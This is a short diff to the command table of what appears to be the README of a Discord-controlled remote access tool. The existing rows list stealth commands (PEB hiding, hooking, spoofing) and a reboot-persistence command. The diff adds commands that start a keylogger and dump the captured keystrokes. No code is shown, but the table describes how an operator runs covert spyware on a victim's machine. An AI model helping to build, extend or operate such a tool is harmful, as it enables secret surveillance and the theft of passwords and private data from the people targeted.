@@ -55,6 +55,8 @@ Run these in the bot channel on Discord.
 | **STEALTH & PERSISTENCE** | `!hide [method]`   | Toggles a stealth feature. Methods: `peb`, `hook`, `spoof`.    |
 |                           | `!stealth`         | Checks which stealth features are active.                      |
 |                           | `!persistence`     | Sets up the agent to survive a reboot.                         |
+| **MONITORING**            | `!keylogger <arg>` | Controls the keylogger. Args: start, stop, status.             |
+|                           | `!keys / !keylogs` | Dumps all captured keystrokes.                                 |
 
 ---
 
